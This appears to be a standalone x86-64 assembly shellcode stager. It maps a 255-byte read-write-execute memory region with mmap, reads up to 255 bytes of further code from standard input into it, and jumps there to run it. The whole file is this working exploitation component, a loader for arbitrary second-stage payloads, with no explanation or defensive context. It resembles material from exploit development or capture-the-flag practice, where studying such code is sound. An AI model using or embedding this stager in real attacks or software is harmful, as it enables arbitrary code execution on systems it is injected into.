BITS 64

global _start:

_start:

 xor rax, rax
 mov al, 8
 add rax, 1
 xor r9, r9
 xor rsi, rsi
 xor r8, r8
 sub r8, 1
 mov r10b, 0x22
 mov dl, 0x7
 mov sil, 0xFF
 xor rdi, rdi
 syscall

 mov rsi, rax
 mov dl, 0xff
 xor rdi, rdi
 xor rax, rax
 syscall

 jmp rsi
